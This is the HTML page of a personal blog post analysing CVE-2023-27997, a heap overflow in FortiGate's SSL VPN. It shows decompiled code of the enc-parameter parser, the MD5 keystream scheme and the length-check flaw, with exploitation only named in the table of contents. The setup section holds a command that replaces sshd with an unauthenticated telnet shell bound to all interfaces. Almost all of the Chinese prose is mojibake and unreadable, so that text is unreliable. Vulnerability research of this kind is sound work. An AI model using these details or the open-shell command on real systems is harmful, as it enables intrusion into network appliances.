<!DOCTYPE html>
<html lang=EN>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="CVE-2023-27997">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow">
<meta property="og:url" content="https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html">
<meta property="og:site_name" content="Swing&#39;Blog æµ®ç”Ÿè‹¥æ¢¦">
<meta property="og:description" content="CVE-2023-27997">
<meta property="og:locale">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-8b343fc31d4a504a4d459250587a38e4-447367.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-f56028c12c14f7a25eea4f193cd88886-95ed7a.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-ba186e829988f5da44acd8c00a454950-121174.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-3c579214a9d839b632cc6a248fc70f20-30b511.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-96cdc2cf4791a8f7e3aae65753ebd0d8-e97ee9.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-4e0284df44bd40b0e419b74bfced6499-4446fa.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-d1f8e940e7046fe389e9ecf78392c333-9e4181.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-ce0846e872e41e303b2eca5ef364df90-704e11.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-bc72ef0094686857032b3a9e058315e3-c9a332.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-a4930365eb0a53489ff736eff83e0c9e-f36a67.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-4994090cd5a6c71e1d1c02b3a843fe13-a5245c.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-feac6e93867e3afd30cd73f00de7c7f0-2031ee.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-8af32ae43ee156ed62aff6c50e7ba555-cc0cbe.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-d9a69e8ee03dbce4df4a250e873625d0-092293.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-b44f04c102f10f092eb78af81e384f08-6327ef.png">
<meta property="article:published_time" content="2023-09-20T16:00:00.000Z">
<meta property="article:modified_time" content="2023-09-21T10:42:18.714Z">
<meta property="article:author" content="Swing">
<meta property="article:tag" content="pwn">
<meta property="article:tag" content="CVE-2023-27997">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-8b343fc31d4a504a4d459250587a38e4-447367.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
      <link rel="alternate" href="/atom.xml" title="Swing&#39;Blog æµ®ç”Ÿè‹¥æ¢¦" type="application/atom+xml" />
    
<meta name="generator" content="Hexo 5.4.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/search">Search</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/link">Links</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" href="/CVE-2022-42475-FortiGate-SSLVPN-HeapOverflow.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html&text=CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html&title=CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html&is_video=false&description=CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow&body=Check out this article: https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html&title=CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html&title=CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html&title=CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html&title=CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html&name=CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html&t=CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">æ¼æ´ç¯å¢ƒæ­å»º</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">æ¼æ´åˆ†æ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">æ¼æ´åˆ©ç”¨</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E8%AF%AD"><span class="toc-number">3.1.</span> <span class="toc-text">åˆ©ç”¨åŸè¯­</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%B8%83%E5%B1%80"><span class="toc-number">3.2.</span> <span class="toc-text">å †å¸ƒå±€</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="toc-number">3.3.</span> <span class="toc-text">æ ˆè¿ç§»</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E6%8C%87%E4%BB%A4"><span class="toc-number">3.4.</span> <span class="toc-text">æ‰§è¡Œä»»æ„æŒ‡ä»¤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Demo"><span class="toc-number">4.</span> <span class="toc-text">Demo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference-link"><span class="toc-number">5.</span> <span class="toc-text">Reference link</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Swing</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-09-20T16:00:00.000Z" itemprop="datePublished">2023-09-21</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">æ¼æ´åˆ†æ</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/CVE-2023-27997/" rel="tag">CVE-2023-27997</a>, <a class="tag-link-link" href="/tags/pwn/" rel="tag">pwn</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL; DR"></a>TL; DR</h2><p>ç”±äº<code>CVE-2023-27997</code> æ¼æ´çš„å½±å“æ¯”è¾ƒå¤§ï¼Œæ‰€ä»¥æˆ‘ä¸€ç›´æ²¡æœ‰å…¬å¼€è¿™ç¯‡åšå®¢ï¼Œ ä½†æ˜¯è·ç¦»è¯¥æ¼æ´å…¬å¼€å·²ç»å·®ä¸å¤šè¿‡å»äº†ä¸‰ä¸ªæœˆäº†ï¼Œ å…¬ç½‘çš„è®¾å¤‡åº”è¯¥éƒ½ä¿®çš„å·®ä¸å¤šäº†å§ï¼Œ å› æ­¤è¿™é‡Œå¯ä»¥å¤§å®¶åˆ†äº«ä¸€ä¸‹å½“æ—¶æˆ‘å’Œ@leommxj ä¸€èµ·å¤ç°è¯¥æ¼æ´çš„ç¬”è®°ã€‚</p>
<p>æ›´å…·ä½“çš„æ¼æ´ç»†èŠ‚å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š <a href="https://blog.lexfo.fr/xortigate-cve-2023-27997.html">Pre-authentication Remote Code Execution on Fortigate VPN </a>, è€Œæˆ‘è¿™é‡Œåˆ†æç‰ˆæœ¬ä¾æ—§æ˜¯ 7.2.2</p>
<h2 id="æ¼æ´ç¯å¢ƒæ­å»º"><a href="#æ¼æ´ç¯å¢ƒæ­å»º" class="headerlink" title="æ¼æ´ç¯å¢ƒæ­å»º"></a>æ¼æ´ç¯å¢ƒæ­å»º</h2><p>å‚è€ƒå¯ä»¥å‚è€ƒæˆ‘ä¸Šä¸€ç¯‡æ–‡ç«  ã€ŠCVE-2022-42475-FortiGate-SSLVPN-HeapOverflowã€‹</p>
<p>åœ¨è°ƒè¯•çš„æ—¶å€™ ï¼Œ æ‰¾ @leommxj å’Œ @explorer å¸®æˆ‘é…ç½®äº†ç½‘ç»œç¯å¢ƒï¼Œ ä¸€å¼€å§‹ç”¨çš„æ˜¯ gdb + vmware çš„è°ƒè¯•æ–¹æ³•ï¼Œåé¢æ”¹ç”¨ gdbserver + gdb çš„æ–¹æ³•äº†ï¼Œ ç”±äº fortigate çš„é˜²ç«å¢™åŸå› ï¼Œæˆ‘ä»¬å¤ç”¨äº† 22 ç«¯å£ å’Œ23 ç«¯å£</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kill -9 $(pidof sshd) &amp;&amp; .&#x2F;busybox_TELNETD -b 0.0.0.0:22 -l &#x2F;bin&#x2F;sh</span><br><span class="line">kill -9 $(pidof telnetd) &amp;&amp; .&#x2F;gdbserver 0.0.0.0:23 --attach  $(pidof sslvpnd)</span><br></pre></td></tr></table></figure>

<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>å½“æˆ‘ä»¬å‘ fortigate sslvpn å‘é€ä¸€ä¸ª <code>enc</code> çš„ HTTP å‚æ•°çš„æ—¶å€™, ä¼šè¿›åˆ°ä¸€ä¸ª <code>parse_enc_data</code> çš„å‡½æ•°é€»è¾‘é‡Œ. </p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-8b343fc31d4a504a4d459250587a38e4-447367.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-8b343fc31d4a504a4d459250587a38e4-447367.png" alt="image.png"></a></p>
<p>å¦å¤–è¿™ä¸ª <code>enc</code> å¤„ç†çš„ URI æœ‰å¾ˆå¤šå¯ä»¥è¿›æ¥, åŒ…æ‹¬ <code>/remote/hostcheck_validate</code>  ä»¥åŠ ^[1] æåˆ°çš„ <code>/remote/logincheck</code> , å…·ä½“ URI çš„é€‰æ‹©,æˆ‘ä»¬åæ–‡æ¥ç€ä¼šæåˆ° ã€‚è¿™é‡Œæ¥ç€åˆ†æ  <code>parse_enc_data</code> å‡½æ•°ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">parse_enc_data</span><span class="params">(__int64 a1, __int64 *pool, <span class="keyword">const</span> <span class="keyword">char</span> *in)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-&quot;+&quot; TO EXPAND]</span></span><br><span class="line"></span><br><span class="line">  v30 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(in);                              <span class="comment">// in (enc) : AA BB CC DD  XX XX HACKED HACKED ...</span></span><br><span class="line">                                                <span class="comment">//               SEED      SIZE     CIPHERTEXT</span></span><br><span class="line">  int_len = v4;</span><br><span class="line">  lenOfData = v4;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)v4 &lt;= <span class="number">11</span> || (v4 &amp; <span class="number">1</span>) != <span class="number">0</span> )         <span class="comment">// enc çš„é•¿åº¦è¦å¤§äº11, ä¸”å¶æ•°</span></span><br><span class="line">  &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆè¿›åˆ°å‡½æ•°é‡Œï¼Œ ä¼šå…ˆåˆ¤æ–­ <code>enc</code> å‚æ•°çš„å€¼æ˜¯å¦é•¿åº¦å¤§äº11, ä¸”å¶æ•° ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MD5Data(salt, (__int64)in, <span class="number">8</span>, (__int64)md5);</span><br><span class="line">out = (__int16 *)alignedAlloc(*pool, (int_len &gt;&gt; <span class="number">1</span>) + <span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>å½“ç¬¦åˆè¦æ±‚åï¼Œ ä¼šä»¥é•¿åº¦çš„ 1/2 çš„å¤§å°åˆ†é…ä¸€ä¸ª buffer , ç„¶åä¸­é—´ä¼šç»è¿‡ä¸€äº›æ•°æ®å¤„ç†ï¼Œç„¶ååˆ°è¾¾å¦å¤–ä¸€ä¸ª check</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">out = decodedData_ + <span class="number">2</span>;</span><br><span class="line">xored_given_len = decodedData_[<span class="number">2</span>];</span><br><span class="line">given_len = (<span class="keyword">unsigned</span> __int8)(xored_given_len ^ md5[<span class="number">0</span>]);</span><br><span class="line">BYTE1(given_len) = md5[<span class="number">1</span>] ^ HIBYTE(xored_given_len);</span><br><span class="line">payloadLength = (<span class="keyword">unsigned</span> __int8)(xored_given_len ^ md5[<span class="number">0</span>]);<span class="comment">// æ£€æŸ¥å¤§å°</span></span><br><span class="line"><span class="keyword">if</span> ( int_len - <span class="number">5</span> &lt;= payloadLength )</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  v17 = decodedData_ + <span class="number">3</span>;</span><br><span class="line">  out = v17;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)xored_given_len != md5[<span class="number">0</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    v18 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(payloadLength - <span class="number">1</span>);</span><br><span class="line">    i = <span class="number">0L</span>L;</span><br><span class="line">    v20 = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *((_BYTE *)v17 + i) ^= md5[v20];    <span class="comment">// bof</span></span><br><span class="line">      <span class="keyword">if</span> ( v18 == i )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v20 = ((_BYTE)i + <span class="number">3</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (((_BYTE)i + <span class="number">3</span>) &amp; <span class="number">0xF</span>) == <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line">      v17 = out;</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    v17 = (__int16 *)((<span class="keyword">char</span> *)out + (<span class="keyword">unsigned</span> __int16)given_len);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä¼šå°†æ•°æ®çš„é•¿åº¦ï¼ˆå®é™…ä¼ å…¥çš„é•¿åº¦ ï¼‰ å’Œ <code>enc</code> è¿™ä¸ªå‚æ•°å®šä¹‰çš„ payload çš„é•¿åº¦æ¯”è¾ƒï¼Œ å¦‚æœç¬¦åˆ  <code>int_len - 5 &lt;= payloadLength</code> ï¼Œ å³å®é™…é•¿åº¦å¤§äºå®šä¹‰çš„é•¿åº¦ï¼Œ å³æ¥ç€å¾€ä¸‹èµ°ã€‚ æ³¨æ„è¿™é‡Œä¼šå‡ºç°ä¸€ä¸ªå®‰å…¨é—®é¢˜ï¼š</p>
<p>å› ä¸ºå®é™…åˆ†é…çš„buffer çš„é•¿åº¦åº”è¯¥æ˜¯å®é™…é•¿åº¦çš„ 1/2 ï¼Œè€Œè¿™é‡Œå´æ˜¯ç”¨åŸæ¥çš„é•¿åº¦æ¯”è¾ƒçš„ï¼Œå› æ­¤åé¢ä¼šå‘ç”Ÿæº¢å‡ºã€‚ä½†æ˜¯è¿™é‡Œçš„æº¢å‡ºçš„å­—èŠ‚æ˜¯ä¸€ä¸ª md5 å¼‚æˆ–, è¿™é‡Œä¼šå¯¹æˆ‘ä»¬åé¢çš„åˆ©ç”¨æå‡ºä¸€ç‚¹ç‚¹çš„éš¾åº¦,ä½†æ˜¯ä½œè€…å´ç”¨äº†ä¸€ä¸ªå¾ˆå·§å¦™çš„æ¥å®Œæˆ ã€‚</p>
<p>è¿™é‡Œç®€å•æ€»ç»“ä¸‹è¿™ä¸ªå‡½æ•°å’Œæç‚¼ä¸‹ <code>enc</code> çš„ç»“æ„, é¦–å…ˆ <code>enc</code> å‚æ•°æ˜¯ä¸€ä¸ªåŒ…å« seedã€sizeï¼ˆ2 ä¸ªå­—èŠ‚ï¼‰å’Œæ•°æ®çš„ç»“æ„ã€‚å¤§å°å’Œæ•°æ®éƒ½æ˜¯åŠ å¯†çš„ã€‚ å¤§è‡´å°±ä¸‹å›¾çš„æ ·å­.</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-f56028c12c14f7a25eea4f193cd88886-95ed7a.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-f56028c12c14f7a25eea4f193cd88886-95ed7a.png" alt="image.png"></a></p>
<p>seed å­˜å‚¨ä¸º 8 ä¸ªåå…­è¿›åˆ¶å­—ç¬¦ï¼Œç”¨äºè®¡ç®— XOR å¯†é’¥æµçš„ç¬¬ä¸€ä¸ªçŠ¶æ€ï¼š</p>
<p><code>S0 = MD5(salt|seed| &quot;GCC is the GNU Compiler Collection.&quot;)</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">MD5Data</span><span class="params">(<span class="keyword">char</span> *salt, __int64 enc, <span class="keyword">int</span> size, __int64 output)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  <span class="title">MD5_Init</span><span class="params">(v8)</span></span>;</span><br><span class="line">  v6 = <span class="built_in">strlen</span>(salt);</span><br><span class="line">  MD5_Update(v8, salt, v6);</span><br><span class="line">  MD5_Update(v8, enc, size);</span><br><span class="line">  MD5_Update(v8, <span class="string">&quot;GCC is the GNU Compiler Collection.&quot;</span>, <span class="number">35L</span>L);</span><br><span class="line">  MD5_Final(output, v8);</span><br><span class="line">  <span class="keyword">return</span> v9 - __readfsqword(<span class="number">0</span>x</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„ <code>salt</code> æ˜¯ç”±æœåŠ¡å™¨åˆ›å»ºçš„éšæœºå€¼, å¯ä»¥é€šè¿‡ <code>GET /remote/info HTTP/1.1</code> è·å–åˆ° </p>
<p>å¯†é’¥æµçš„å…¶ä»–çŠ¶æ€è®¡ç®—å¦‚ä¸‹ï¼š</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-ba186e829988f5da44acd8c00a454950-121174.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-ba186e829988f5da44acd8c00a454950-121174.png" alt="image.png"></a><br>å‡½æ•°è¡Œä¸º:</p>
<ol>
<li>è®¡ç®— MD5ï¼ˆ16 å­—èŠ‚ï¼‰ï¼Œè¿™æ˜¯æ¥è‡ªç›å’Œç§å­çš„å¯†é’¥çš„ç¬¬ä¸€ä¸ªçŠ¶æ€ï¼ˆin çš„å‰ 8 ä¸ªå­—ç¬¦ï¼‰</li>
<li>åˆ†é…å¤§å°ä¸º in_len / 2 + 1ã€out å’Œåå…­è¿›åˆ¶è§£ç è¾“å…¥çš„ç¼“å†²åŒº</li>
<li>é€šè¿‡å°†æœ‰æ•ˆè´Ÿè½½çš„å‰ä¸¤ä¸ªå­—èŠ‚ä¸å¯†é’¥çš„å‰ä¸¤ä¸ªå­—èŠ‚è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œè®¡ç®—ç”¨æˆ·ç»™å®šçš„é•¿åº¦ given_len</li>
<li>è¾¹ç•Œæ£€æŸ¥ï¼šéªŒè¯ç»™å®šçš„é•¿åº¦ä¸å¤§äºç¼“å†²åŒºçš„å¤§å°</li>
<li>å°±åœ°è§£å¯†æ•´ä¸ªå­—ç¬¦ä¸²ï¼šå¯¹å‰ 14 ä¸ªå­—èŠ‚è¿›è¡Œ XORï¼Œç„¶åè®¡ç®—ä¸€ä¸ªæ–°çŠ¶æ€ ğ¾ 1ä¸ª ï¼Œç”¨å®ƒå¯¹æ¥ä¸‹æ¥çš„ 16 ä¸ªå­—èŠ‚è¿›è¡Œå¼‚æˆ–ï¼Œç„¶åé‡å¤ã€‚</li>
<li>åœ¨è§£å¯†æ•°æ®çš„æœ«å°¾æ”¾ç½®ä¸€ä¸ª NULL å­—èŠ‚</li>
<li>å½“ç¨‹åºæ£€æŸ¥ç»™å®šé•¿åº¦ä¸å¤§äºå‘é€çš„æœ‰æ•ˆè´Ÿè½½çš„é•¿åº¦æ—¶ï¼Œå®ƒä¼šå°† in_len ä¸ given_len è¿›è¡Œæ¯”è¾ƒã€‚ä½†æ˜¯ï¼Œå‰è€…ä»¥åå…­è¿›åˆ¶æè¿°æœ‰æ•ˆè´Ÿè½½çš„é•¿åº¦ï¼ˆä¾‹å¦‚â€œ41424343â€ï¼‰ï¼Œè€Œåè€…ä»¥åŸå§‹å­—èŠ‚æè¿°å…¶å¤§å°ï¼ˆä¾‹å¦‚â€œABCDâ€ï¼‰ã€‚å› æ­¤ï¼Œgiven_len å¯ä»¥æ˜¯å®ƒåº”è¯¥çš„ä¸¤å€å¤§ã€‚å› æ­¤é€ æˆäº†æº¢å‡º</li>
</ol>
<blockquote>
<p>è¿™é‡Œç¨å¾®åæ§½ä¸€ä¸‹ï¼Œ IDA çš„åç¼–è¯‘é”™è¯¯å¯¼è‡´å¾ˆå¤šæ–‡ç« å¯¹è¯¥æ¼æ´çš„äº§ç”ŸåŸå› çš„æè¿°æœ‰äº›é”™è¯¯</p>
<p><a href="https://twitter.com/bestswngs/status/1670709186509045761">wrong results of Hex-Rays</a></p>
</blockquote>
